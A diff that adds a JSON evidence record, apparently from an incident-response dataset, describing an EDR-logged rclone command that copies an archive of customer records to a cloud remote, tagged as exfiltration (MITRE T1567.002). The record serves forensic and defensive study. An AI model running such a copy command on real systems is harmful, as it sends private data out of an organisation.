@@ -1,0 +1,17 @@
+{
+  "evidence_id": "EV-exfil01-07",
+  "incident_id": "INC-2026-0003",
+  "source": "edr",
+  "event_type": "process_execution",
+  "timestamp": "2026-10-02T01:19:58Z",
+  "host_id": "FS-ARCH-05",
+  "description": "rclone.exe invoked with arguments copy C:\\Temp\\cust_rec_20261002.7z remote:cust-archive; rclone is a common exfiltration tool.",
+  "raw_data": {
+    "process": "rclone.exe",
+    "arguments": "copy C:\\Temp\\cust_rec_20261002.7z remote:cust-archive",
+    "remote": "cust-archive",
+    "mitre": "T1567.002"
+  },
+  "collected_at": "2026-10-02T02:32:00Z",
+  "collection_tool": "edr-agent"
+}
